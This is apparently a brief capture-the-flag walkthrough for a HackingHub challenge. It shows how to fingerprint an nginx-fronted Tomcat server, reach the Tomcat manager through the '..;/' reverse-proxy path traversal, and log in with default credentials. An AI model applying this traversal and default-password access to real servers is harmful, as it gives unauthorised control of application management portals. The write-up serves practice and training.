https://app.hackinghub.io/hubs/bluewings


`https://deneb.ctfio.com/lol` gives a nginx 404 page 
`https://deneb.ctfio.com/staff/` -> login form
`https://deneb.ctfio.com/staff/lol` gives a tomcat 404 page -> Apache tomcat present
Exploiting the tomcat RP with traversal
`https://deneb.ctfio.com/staff/..;/` -> We are able to access the tomcat server  root page.
Using it to access managment portal
`https://deneb.ctfio.com/staff/..;/manager/html`
use default password of tomcatgui:tomcatgui